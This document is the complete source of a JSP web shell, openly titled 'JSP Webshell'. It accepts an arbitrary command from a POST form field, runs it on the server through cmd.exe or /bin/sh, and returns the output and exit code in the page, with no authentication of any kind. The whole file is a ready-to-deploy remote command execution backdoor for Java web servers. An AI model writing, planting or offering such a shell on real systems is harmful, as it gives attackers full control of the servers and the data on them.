<%@ page import="java.io.BufferedReader,java.io.InputStreamReader" %>
<%!
    String htmlEscape(String in) {
        return in.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;").replaceAll("\"", "&quot;").replaceAll("'", "&#039;");
    }
%>
<%
    String shell = null;
    String shellOpt = null;
    String cmd = null;
    Integer exitCode = null;
    StringBuilder stdout = new StringBuilder("");
    if(request.getMethod().equals("POST") && !request.getParameter("cmd").trim().equals("")) {
        String osName = System.getProperty("os.name").toLowerCase();
        if(osName.contains("windows")) {
            shell = "cmd.exe";
            shellOpt = "/c";
        } else {
            shell = "/bin/sh";
            shellOpt = "-c";
        }
        cmd = request.getParameter("cmd");
        ProcessBuilder pb = new ProcessBuilder(shell, shellOpt, cmd);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader stdoutReader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String s = null;
        while((s = stdoutReader.readLine()) != null) {
            stdout.append(s).append(System.getProperty("line.separator"));
        }
        exitCode = p.waitFor();
    }
%>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>JSP Webshell</title>
    </head>
    <body style="font-family: sans-serif;">
        <form method="POST" action="">
            <input type="text" name="cmd" autofocus="autofocus" style="width: 80%;" />
            <input type="submit" name="submit-cmd" value="Run" />
        </form>
        <div style="margin: 3px auto;">
<%
    if(cmd != null) {
        out.println("Output of command <code>" + htmlEscape(shell) + " " + htmlEscape(shellOpt) + "</code> with argument: <code>" + htmlEscape(cmd) + "</code>");
    } else {
        out.println("Run a command to see its output");
    }
%>
        </div>
        <textarea readonly="readonly" rows="25" style="width: 80%;">
<%= htmlEscape(stdout.toString()) %>
        </textarea>
        <div style="margin: 3px auto;">
<%
    if(exitCode != null) {
        out.println("Exit code: <code>" + exitCode + "</code>");
    }
%>
        </div>
    </body>
</html>
